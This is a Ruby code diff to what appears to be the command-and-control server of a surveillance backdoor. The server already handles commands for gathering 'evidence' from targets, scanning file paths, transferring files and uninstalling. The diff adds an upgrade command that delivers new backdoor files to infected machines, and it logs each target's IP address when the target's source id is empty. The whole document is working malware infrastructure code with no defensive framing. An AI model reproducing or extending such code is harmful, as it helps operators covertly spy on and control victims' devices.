@@ -29,6 +29,7 @@ module Commands
   PROTO_UNINSTALL  = 0x0a       # Uninstall command
   PROTO_DOWNLOAD   = 0x0c       # List of files to be downloaded
   PROTO_UPLOAD     = 0x0d       # A file to be saved
+  PROTO_UPGRADE    = 0x16       # Upgrade for the backdoor
   PROTO_EVIDENCE   = 0x09       # Upload of an evidence
   PROTO_FILESYSTEM = 0x19       # List of paths to be scanned
 
@@ -37,6 +38,7 @@ module Commands
              PROTO_UPLOAD => :command_upload,
              PROTO_DOWNLOAD => :command_download,
              PROTO_FILESYSTEM => :command_filesystem,
+             PROTO_UPGRADE => :command_upgrade,
              PROTO_EVIDENCE => :command_evidence,
              PROTO_BYE => :command_bye}
 
@@ -50,6 +52,9 @@ module Commands
 
     # ident of the target
     user_id, device_id, source_id = message.unpascalize_ary
+
+    # if the source id cannot be determined by the client, set it to the ip address
+    source_id = peer if source_id.eql? ''
 
     trace :info, "[#{peer}][#{session[:cookie]}] Identification: #{version} '#{user_id}' '#{device_id}' '#{source_id}'"
 
@@ -72,6 +77,10 @@ module Commands
     if DB.instance.new_conf? session[:bid] then
       available += [PROTO_CONF].pack('i')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New config"
+    end
+    if DB.instance.new_upgrade? session[:bid]
+      available += [PROTO_UPGRADE].pack('i')
+      trace :info, "[#{peer}][#{session[:cookie]}] Available: New upgrade"
     end
     if DB.instance.new_downloads? session[:bid] then
       available += [PROTO_DOWNLOAD].pack('i')
@@ -160,6 +169,35 @@ module Commands
       response += [content.length].pack('i') + content
 
       trace :info, "[#{peer}][#{session[:cookie]}] [#{upload[:filename]}][#{upload[:content].length}] sent (#{left} left)"
+    end
+
+    return response
+  end
+
+    # Protocol Upgrade
+  # -> PROTO_UPGRADE
+  # <- PROTO_NO | PROTO_OK [ left, filename, content ]
+  def command_upgrade(peer, session, message)
+    trace :info, "[#{peer}][#{session[:cookie]}] Upgrade request"
+
+    # the upgrade list was already retrieved (if any) during the ident phase (like upload)
+    upgrade, left = DB.instance.new_upgrade session[:bid]
+
+    # send the response
+    if upgrade.nil? then
+      trace :info, "[#{peer}][#{session[:cookie]}] NO upgrade"
+      response = [PROTO_NO].pack('i')
+    else
+      response = [PROTO_OK].pack('i')
+
+      content = [left].pack('i')                      # number of upgrades still waiting in the db
+      content += upgrade[:filename].pascalize         # filename
+      content += [upgrade[:content].length].pack('i') # file size
+      content += upgrade[:content]                    # file content
+
+      response += [content.length].pack('i') + content
+
+      trace :info, "[#{peer}][#{session[:cookie]}] [#{upgrade[:filename]}][#{upgrade[:content].length}] sent (#{left} left)"
     end
 
     return response
